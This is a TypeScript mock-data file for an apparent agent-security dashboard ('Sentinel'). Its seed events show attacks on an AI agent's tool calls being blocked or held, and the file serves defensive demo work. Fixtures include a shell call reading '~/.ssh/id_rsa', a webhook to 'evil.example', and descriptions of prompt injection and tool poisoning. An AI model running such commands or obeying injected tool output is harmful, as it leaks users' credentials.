import type { CheckpointResult, SentinelEvent } from "../types/event";

const CHECKPOINT_LABELS: Record<CheckpointResult["id"], string> = {
  fingerprint: "Tool Fingerprint",
  injection: "Injection Scan",
  intent: "Intent Validation",
  provenance: "Provenance / Taint",
  risk: "Risk Engine",
};

let counter = 0;
function nextId() {
  counter += 1;
  return `evt_${Date.now()}_${counter}`;
}

function checkpoints(
  overrides: Partial<Record<CheckpointResult["id"], { passed: boolean; detail?: string }>>
): CheckpointResult[] {
  const order: CheckpointResult["id"][] = [
    "fingerprint",
    "injection",
    "intent",
    "provenance",
    "risk",
  ];
  return order.map((id) => ({
    id,
    label: CHECKPOINT_LABELS[id],
    passed: overrides[id]?.passed ?? true,
    detail: overrides[id]?.detail,
  }));
}

function minutesAgo(mins: number): string {
  return new Date(Date.now() - mins * 60_000).toISOString();
}

// A fixed, hand-authored set of events covering every scenario the
// dashboard needs to demo: normal traffic, an ASK, and one example
// of each attack type Vibha's attack runner produces.
export const SEED_EVENTS: SentinelEvent[] = [
  {
    id: nextId(),
    timestamp: minutesAgo(14),
    toolName: "search_flights",
    server: "benign",
    intent: "Find flights from BLR to DEL next Friday",
    toolAction: 'search_flights(origin="BLR", destination="DEL", date="next Friday")',
    decision: "ALLOW",
    riskScore: 4,
    reason: "Call matches declared intent and tool scope. No anomalies.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({}),
  },
  {
    id: nextId(),
    timestamp: minutesAgo(13),
    toolName: "get_weather",
    server: "benign",
    intent: "Check weather before booking outdoor venue",
    toolAction: 'get_weather(location="venue")',
    decision: "ALLOW",
    riskScore: 2,
    reason: "Low-risk read-only tool, response clean.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({}),
  },
  {
    id: nextId(),
    timestamp: minutesAgo(12),
    toolName: "send_email",
    server: "benign",
    intent: "Draft a follow-up email to a client",
    toolAction: 'send_email(to="client@example.com", subject="Follow-up")',
    decision: "ASK",
    riskScore: 46,
    reason: "Tool can perform an external side-effect (send mail) outside the read-only scope implied by the user's original request.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({
      intent: { passed: false, detail: "Send action exceeds inferred read-only intent" },
    }),
    attackType: undefined,
  },
  {
    id: nextId(),
    timestamp: minutesAgo(11),
    toolName: "summarize_webpage",
    server: "malicious",
    intent: "Summarize this support article for me",
    toolAction: 'summarize_webpage(url="https://support.example.com/article/482")',
    decision: "BLOCK",
    riskScore: 92,
    reason:
      "Tool response contained an embedded instruction attempting to redirect the agent to exfiltrate credentials via a second tool call.",
    tainted: true,
    fingerprintMismatch: false,
    checkpoints: checkpoints({
      injection: { passed: false, detail: "Hidden directive detected in returned content" },
      provenance: { passed: false, detail: "Tagged tainted: untrusted external source" },
      risk: { passed: false },
    }),
    attackType: "prompt-injection",
  },
  {
    id: nextId(),
    timestamp: minutesAgo(10),
    toolName: "list_calendar_events",
    server: "malicious",
    intent: "Show me tomorrow's meetings",
    toolAction: 'list_calendar_events(range="tomorrow")',
    decision: "BLOCK",
    riskScore: 88,
    reason:
      "Tool description was altered post-registration (rug pull). Live schema no longer matches the fingerprinted, trusted definition.",
    tainted: false,
    fingerprintMismatch: true,
    checkpoints: checkpoints({
      fingerprint: { passed: false, detail: "SHA-256 mismatch vs. registered baseline" },
      risk: { passed: false },
    }),
    attackType: "rug-pull",
  },
  {
    id: nextId(),
    timestamp: minutesAgo(9),
    toolName: "read_file",
    server: "benign",
    intent: "Read notes.txt for the meeting summary",
    toolAction: 'read_file("notes.txt")',
    decision: "ALLOW",
    riskScore: 6,
    reason: "Scoped file read, path matches sandbox allowlist.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({}),
  },
  {
    id: nextId(),
    timestamp: minutesAgo(8),
    toolName: "execute_shell_command",
    server: "malicious",
    intent: "Read notes.txt for the meeting summary",
    toolAction: 'execute_shell_command("cat ~/.ssh/id_rsa")',
    decision: "BLOCK",
    riskScore: 97,
    reason:
      "Cross-tool escalation: output from an earlier tainted tool call was used to trigger a privileged shell tool never authorized by the original intent.",
    tainted: true,
    fingerprintMismatch: false,
    checkpoints: checkpoints({
      intent: { passed: false, detail: "No shell access implied by original request" },
      provenance: { passed: false, detail: "Triggered by tainted upstream data" },
      risk: { passed: false },
    }),
    attackType: "cross-tool",
  },
  {
    id: nextId(),
    timestamp: minutesAgo(7),
    toolName: "translate_text",
    server: "benign",
    intent: "Translate this paragraph to Hindi",
    toolAction: 'translate_text(text="...", target="hi")',
    decision: "ALLOW",
    riskScore: 3,
    reason: "Stateless transform, no external data touched.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({}),
  },
  {
    id: nextId(),
    timestamp: minutesAgo(6),
    toolName: "fetch_invoice_pdf",
    server: "malicious",
    intent: "Grab last month's invoice",
    toolAction: 'fetch_invoice_pdf(month="last") + register_webhook("http://evil.example/hook")',
    decision: "BLOCK",
    riskScore: 90,
    reason:
      "Tool metadata advertised as 'read-only PDF fetch' but request payload attempted to register a new outbound webhook — classic tool poisoning.",
    tainted: false,
    fingerprintMismatch: true,
    checkpoints: checkpoints({
      fingerprint: { passed: false, detail: "Declared capability vs. actual call diverge" },
      intent: { passed: false, detail: "Webhook registration not requested by user" },
      risk: { passed: false },
    }),
    attackType: "tool-poisoning",
  },
  {
    id: nextId(),
    timestamp: minutesAgo(5),
    toolName: "get_stock_price",
    server: "benign",
    intent: "What's TCS trading at right now",
    toolAction: 'get_stock_price(symbol="TCS")',
    decision: "ALLOW",
    riskScore: 5,
    reason: "Public read-only data, no side effects.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({}),
  },
  {
    id: nextId(),
    timestamp: minutesAgo(4),
    toolName: "update_dns_record",
    server: "malicious",
    intent: "Check if the website is online",
    toolAction: 'update_dns_record(zone="example.com", type="A", value="203.0.113.9")',
    decision: "ASK",
    riskScore: 61,
    reason: "Privileged infrastructure mutation requested from a read-only intent. Held for user confirmation rather than auto-blocked.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({
      intent: { passed: false, detail: "Mutating call from a status-check intent" },
    }),
    attackType: "cross-tool",
  },
  {
    id: nextId(),
    timestamp: minutesAgo(3),
    toolName: "query_orders_db",
    server: "benign",
    intent: "How many orders shipped this week",
    toolAction: 'query_orders_db(filter="shipped", range="7d")',
    decision: "ALLOW",
    riskScore: 8,
    reason: "Parameterized read query within declared schema scope.",
    tainted: false,
    fingerprintMismatch: false,
    checkpoints: checkpoints({}),
  },
];

const POOL_TOOLS: { tool: string; server: "benign" | "malicious"; action: string }[] = [
  { tool: "search_flights", server: "benign", action: 'search_flights(origin="BLR", destination="DEL")' },
  { tool: "get_weather", server: "benign", action: 'get_weather(location="current")' },
  { tool: "read_file", server: "benign", action: 'read_file("notes.txt")' },
  { tool: "translate_text", server: "benign", action: 'translate_text(text="...", target="hi")' },
  { tool: "get_stock_price", server: "benign", action: 'get_stock_price(symbol="TCS")' },
  { tool: "query_orders_db", server: "benign", action: 'query_orders_db(filter="shipped")' },
  { tool: "summarize_webpage", server: "malicious", action: 'summarize_webpage(url="https://example.com/article")' },
  { tool: "list_calendar_events", server: "malicious", action: 'list_calendar_events(range="tomorrow")' },
  { tool: "execute_shell_command", server: "malicious", action: 'execute_shell_command("cat ~/.ssh/id_rsa")' },
  { tool: "fetch_invoice_pdf", server: "malicious", action: 'fetch_invoice_pdf(month="last")' },
  { tool: "update_dns_record", server: "malicious", action: 'update_dns_record(zone="example.com")' },
];

const ATTACK_TYPES = ["prompt-injection", "tool-poisoning", "rug-pull", "cross-tool"] as const;

/**
 * Produces one new synthetic event, used to keep the live feed moving
 * during independent frontend development or offline demos.
 *
 * When `guardOn` is false, malicious-server events are simulated as
 * getting through (ALLOW) instead of BLOCK — this powers the
 * "Guard OFF → attack succeeds → Guard ON → attack blocked" demo beat.
 */
export function generateMockEvent(guardOn: boolean): SentinelEvent {
  const pick = POOL_TOOLS[Math.floor(Math.random() * POOL_TOOLS.length)];
  const isMalicious = pick.server === "malicious";

  if (!isMalicious) {
    return {
      id: nextId(),
      timestamp: new Date().toISOString(),
      toolName: pick.tool,
      server: "benign",
      intent: "Routine tool call from the demo agent",
      toolAction: pick.action,
      decision: "ALLOW",
      riskScore: Math.floor(Math.random() * 12) + 1,
      reason: "Call matches declared intent and tool scope. No anomalies.",
      tainted: false,
      fingerprintMismatch: false,
      checkpoints: checkpoints({}),
    };
  }

  const attackType = ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)];
  const blocked = guardOn;

  const detailByAttack: Record<(typeof ATTACK_TYPES)[number], Partial<Record<CheckpointResult["id"], { passed: boolean; detail?: string }>>> = {
    "prompt-injection": {
      injection: { passed: !blocked, detail: "Hidden directive detected in returned content" },
      provenance: { passed: !blocked, detail: "Tagged tainted: untrusted external source" },
    },
    "tool-poisoning": {
      fingerprint: { passed: !blocked, detail: "Declared capability vs. actual call diverge" },
      intent: { passed: !blocked, detail: "Undeclared side effect requested" },
    },
    "rug-pull": {
      fingerprint: { passed: !blocked, detail: "SHA-256 mismatch vs. registered baseline" },
    },
    "cross-tool": {
      intent: { passed: !blocked, detail: "Escalation beyond original intent scope" },
      provenance: { passed: !blocked, detail: "Triggered by tainted upstream data" },
    },
  };

  const overrides = { ...detailByAttack[attackType], risk: { passed: !blocked } };

  return {
    id: nextId(),
    timestamp: new Date().toISOString(),
    toolName: pick.tool,
    server: "malicious",
    intent: "Routine tool call from the demo agent",
    toolAction: pick.action,
    decision: blocked ? "BLOCK" : "ALLOW",
    riskScore: blocked ? Math.floor(Math.random() * 15) + 82 : Math.floor(Math.random() * 20) + 5,
    reason: blocked
      ? `Sentinel intercepted a ${attackType.replace("-", " ")} attempt before execution.`
      : `Guard is OFF — ${attackType.replace("-", " ")} attempt reached the tool unchecked.`,
    tainted: attackType === "prompt-injection" || attackType === "cross-tool" ? blocked : false,
    fingerprintMismatch: (attackType === "rug-pull" || attackType === "tool-poisoning") && blocked,
    checkpoints: checkpoints(overrides),
    attackType,
  };
}
